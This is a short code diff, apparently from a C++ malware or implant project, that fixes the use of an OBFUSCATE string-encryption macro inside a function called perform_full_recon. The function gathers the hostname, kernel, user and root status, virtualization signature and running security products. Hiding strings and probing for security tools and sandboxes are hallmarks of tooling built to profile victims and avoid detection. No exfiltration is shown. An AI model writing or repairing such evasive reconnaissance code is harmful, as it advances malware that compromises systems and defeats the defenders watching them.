@@ -400,8 +400,8 @@ std::string perform_full_recon() {
     std::string sec_products = detect_security_products(processes);
     
     output << OBFUSCATE("=== SYSTEM RECONNAISSANCE ===\n").decrypt();
-    output << OBFUSCATE("Hostname: " << hostname << "\n").decrypt();
-    output << OBFUSCATE("Kernel: " << kernel << "\n").decrypt();
+    output << OBFUSCATE("Hostname: ").decrypt() << hostname << "\n";
+    output << OBFUSCATE("Kernel: ").decrypt() << kernel << "\n";
     output << OBFUSCATE("UID: ").decrypt() << uid << " | GID: " << gid << " | Root: " << (is_root ? "YES" : "NO") << "\n";
     output << OBFUSCATE("Virtualization: ").decrypt() << (hv.present ? hv.signature : "PHYSICAL") << "\n";
     output << OBFUSCATE("Security Products: ").decrypt() << (sec_products.empty() ? "None detected" : sec_products) << "\n";
